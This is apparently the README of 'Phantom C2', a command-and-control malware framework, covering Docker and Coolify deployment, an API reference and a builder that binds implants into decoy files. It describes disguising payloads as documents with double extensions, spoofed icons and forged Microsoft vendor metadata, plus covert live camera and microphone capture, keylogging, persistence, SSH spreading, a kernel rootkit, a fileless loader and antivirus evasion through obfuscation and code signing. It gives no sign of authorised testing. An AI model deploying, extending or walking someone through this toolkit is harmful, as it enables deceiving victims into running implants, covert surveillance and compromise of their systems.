# Phantom C2

A self-hosted command-and-control framework: encrypted beacon, dashboard, cross
compiled implants, **file binder** with document icons, live camera and live
microphone streaming, keylogging, SOCKS pivoting and a Linux kernel rootkit.

Runs as a single Docker container and deploys cleanly on Coolify.

---

## What it does

| Area | Feature |
| --- | --- |
| Transport | AES-256-GCM sealed beacons over HTTPS, sleep + jitter, fallback C2 URL |
| Stealth | `-H windowsgui` (no console window), hidden child processes, `FreeConsole`, `-trimpath`, randomised user agent, start delay, optional `garble` / `upx` |
| Binder | Wraps **any** file (PDF, DOCX, XLSX, ZIP, JPG, EXE …) into one executable that opens the decoy with the default handler and runs the implant behind it, with the matching document icon |
| Surveillance | Live camera MJPEG stream, live microphone PCM stream to the browser, screenshots, one-shot webcam/mic capture, keylogger |
| Control | Shell, file browser, upload/download, process list, persistence (systemd / Run key / cron), rootkit modules, network scan, SSH spread, SOCKS5 pivot |
| Ops | Multi-target broadcast, per-target sleep/jitter, notes and tags, session export |

---

## Coolify deployment

One click, one optional env var. Coolify renders the whole settings form for
you: `docker-compose.yml` declares every knob with a working default, so the
**Environment Variables** tab comes pre-filled and you only change what you
want. Nothing has to be set — credentials, PSK and callback URL are handled
automatically.

1. **Add the repo**: Project → Environment → **+ New** → *Public Repository* →
   paste the repo URL → **Check Repository** → *Build Pack* **Docker Compose**
   (or **Dockerfile** with Base Directory `/` and Dockerfile Location
   `/Dockerfile`; never leave it on Nixpacks) → **Save**.
2. **Environment Variables** (optional): the tab already lists all settings with
   defaults. Fill only what you want, e.g. `PHANTOM_AUTH=admin:MyStrongPass`.
   To set everything at once, paste the contents of [`.env.example`](.env.example)
   into the *Developer view* box and edit it there.
3. **Set the domain**: `https://your.domain` — **no port suffix**, the container
   listens on 80, which is the proxy default. Leave *Ports Exposes* at `80`.
4. **Deploy**, then open **Runtime Logs** and copy the generated login:

   ```
   [*] dashboard login (generated, persisted in /data/auth): admin:Xk3pQ9...
   ```

Log in with that and you're done. Everything else is automatic:

| Setting | Default behaviour | Env var |
| --- | --- | --- |
| Dashboard login | Random `admin:<20 chars>` on first boot, persisted in `/data/auth`, printed in the logs | `PHANTOM_AUTH=user:pass` |
| PSK | Random 32-byte key persisted in `/data/psk` | `PHANTOM_PSK` (64 hex chars) |
| Callback URL | Derived per request from `X-Forwarded-Host`, so payloads always point at your domain | `PHANTOM_PUBLIC_URL` |
| Volume | Named volume mounted at `/data`, holds auth, PSK, builds and blobs | `PHANTOM_DATA` |
| Health check | `HEALTHCHECK` on `/healthz`; path is public, no credentials needed | `PHANTOM_PORT` |

### All settings

Every variable below is optional and already pre-filled by Coolify. Full
template: [`.env.example`](.env.example).

| Variable | Default | Meaning |
| --- | --- | --- |
| `PHANTOM_AUTH` | *(generated)* | Dashboard `user:password`; empty generates one |
| `PHANTOM_PSK` | *(generated)* | Beacon key, 64 hex chars (`openssl rand -hex 32`) |
| `PHANTOM_DEFAULT_PSK` | `false` | `true` reuses the shipped dev key instead of a random one |
| `PHANTOM_PUBLIC_URL` | *(auto)* | Pin the callback URL instead of deriving it from the request |
| `PHANTOM_HOST` | `0.0.0.0` | Listen address, must stay `0.0.0.0` behind the proxy |
| `PHANTOM_PORT` | `80` | Listen port, keep it in sync with *Ports Exposes* |
| `PHANTOM_TLS` | `false` | Keep off — the proxy terminates TLS |
| `PHANTOM_LOG` | `info` | Uvicorn log level |
| `PHANTOM_DATA` / `PHANTOM_BUILDS` | `/data`, `/data/builds` | Keep on the volume |
| `PHANTOM_VENDOR` | `Microsoft Corporation` | PE metadata company on artifacts |
| `PHANTOM_ENCRYPT` / `PHANTOM_METADATA` | `true` | Seal the embedded implant / apply metadata + icon |
| `PHANTOM_GARBLE` / `PHANTOM_UPX` | `false` | Obfuscation / compression, requires `INSTALL_GARBLE=1` / `INSTALL_UPX=1` build arg |
| `PHANTOM_SIGN_PFX` / `PHANTOM_SIGN_PASS` | *(empty)* | Authenticode-sign every artifact |
| `PHANTOM_SOCKS`, `PHANTOM_SOCKS_HOST`, `PHANTOM_SOCKS_PORT` | `true`, `127.0.0.1`, `1080` | SOCKS pivot listener |
| `PHANTOM_CERT` / `PHANTOM_KEY` | `/app/server/certs/server.{crt,key}` | Only used when `PHANTOM_TLS=true` |

The container compiles payloads on demand: keep the `/data` volume (without it a
redeploy rotates the PSK and breaks every bot built before) and give it ~1.5 GB RAM.

### 502 Bad Gateway right after deploy

A 502 means the proxy is up but cannot reach the container:

1. **Runtime Logs** — the container must log
   `[*] phantom entrypoint: listening target 0.0.0.0:80` and
   `Uvicorn running on http://0.0.0.0:80`. A `[!]` line names the misconfiguration.
2. **Ports Exposes** must be `80`; a `:8000` left over in the domain also works, but
   only if the container really listens on 8000.
3. **Compose "Raw" mode** — Coolify adds no proxy labels/network; use the normal mode.
4. **`PHANTOM_HOST=127.0.0.1`** → 502, use `0.0.0.0` (default).
5. **`PHANTOM_TLS=true`** behind the proxy → 502.
6. Sanity check on the server:
   `docker exec -it <container> curl -fsS http://127.0.0.1:80/healthz`
   → must return `{"ok":true,...}`.

### Deployment fails before the build: `mkdir: can't create directory .../Dockerfile`

```
[CMD]: docker exec ... mkdir -p /artifacts/<id>/Dockerfile
mkdir: can't create directory '/artifacts/<id>/Dockerfile': File exists
```

Coolify concatenates `Base Directory` onto its work directory and runs `mkdir -p` on
that path. `mkdir -p` fails when the path is an existing **file**, so a
`Base Directory` of `/Dockerfile` breaks every deploy of this repo. Use:

| Field | Value |
| --- | --- |
| Base Directory | `/` (leave it as the default slash, *not* `/Dockerfile`) |
| Dockerfile Location | `/Dockerfile` |

### Plain Docker

```sh
docker build -t phantom .
docker run -d --name phantom -p 8000:80 -v phantom-data:/data phantom
docker logs phantom | grep 'dashboard login'     # generated credentials
```

### Compose

```sh
cp .env.example .env          # optional: works without it too
docker compose up -d --build
docker compose logs | grep 'dashboard login'
```

Uncomment the `ports:` block in `docker-compose.yml` for local access.

---

## Local (non Docker) run

```sh
./deploy.sh                 # dependencies + prime the build cache
cd server && python3 server.py
```

Then open `http://127.0.0.1:8000`. Run `python3 server/gen_certs.py` and set
`PHANTOM_TLS=true` if you need TLS on the C2 itself.

---

## Using the builder

1. Open **Builder**.
2. Drop the decoy file (invoice.pdf, contract.docx, photo.jpg …).
3. The callback URL is filled automatically from the request header
   (`X-Forwarded-Host` → public IP → LAN IP). Press **auto** to refresh.
4. Choose platform/arch, sleep, jitter, optional start delay.
5. **Bind & build** → download the artifact from *Artifacts*.

The produced file is `name.pdf.exe` (double extension keeps the PDF icon while
Windows still executes it). On launch the stub:

* writes the decoy to `%TEMP%` and opens it with the shell association,
* drops the implant beside it and starts it detached — no console flash,
* the implant then beacons to the configured URL.

Linux/macOS bindings are `.run` files (`chmod +x` them); they behave the same
using `xdg-open` / `open`.

Toggle **document icon** off to ship a plain `.exe`, or use **build raw implant**
for a bare binary, or **fileless .sh loader** for a memfd-only Linux payload.

---

## Operations notes

* **Live camera** and **live microphone** need `ffmpeg` on the target. Missing
  tools surface as a toast with the exact install hint. Devices are enumerated
  automatically (DirectShow / V4L2 / AVFoundation).
* Camera frames land in the **Media** tab; the audio stream is decoded by Web
  Audio at 16 kHz mono. Both stop with the matching `stop` / `mute` button.
* **SOCKS pivot**: run `socks` on a bot, then point tooling at `127.0.0.1:1080`
  (SSH tunnel or published port).
* **Rootkit** (Linux) needs `phantom_rootkit.ko` built with `make -C rootkit`
  and uploaded to the target.
* Keylogging on Linux needs read access to `/dev/input/*` (root).

## Detection notes

No payload is invisible to every AV engine. What is done here:

* GUI subsystem binary, no console flash, no visible window,
* strings stripped (`-s -w`, `-trimpath`), optional `garble` identifier
  obfuscation and `upx` packing,
* realistic browser user agent, encrypted body, HTTPS with jittered timing,
* decoy first: the user sees the document they expected.

For maximum evasion add a code-signing certificate afterwards:

```sh
osslsigncode sign -certs cert.pem -key key.pem -in in.exe -out out.exe
```

---

## Layout

```
implant/            Go beacon (cross platform) + stealth + live media
server/             FastAPI C2, builder, binder stub, dashboard, crypto
fileless/           memfd loader template
rootkit/            Linux LKM
Dockerfile          Coolify-ready image
docker-compose.yml  Coolify service definition (every setting = env var)
.env.example        env template to paste into Coolify
```

## API quick reference

| Method | Path | Purpose |
| --- | --- | --- |
| `POST` | `/beacon` | encrypted beacon in/out |
| `POST` | `/api/media/push` | camera / microphone frames from implants |
| `GET` | `/api/config` | auto-detected callback URL and build limits |
| `POST` | `/api/bind` | multipart bind (file + options) |
| `POST` | `/api/build` | raw implant build |
| `GET/DELETE` | `/api/builds…` | artifact management |
| `POST` | `/api/session/{id}/command` | queue a command |
| `POST` | `/api/broadcast` | fan out a command |
| `GET` | `/healthz` | container health probe |

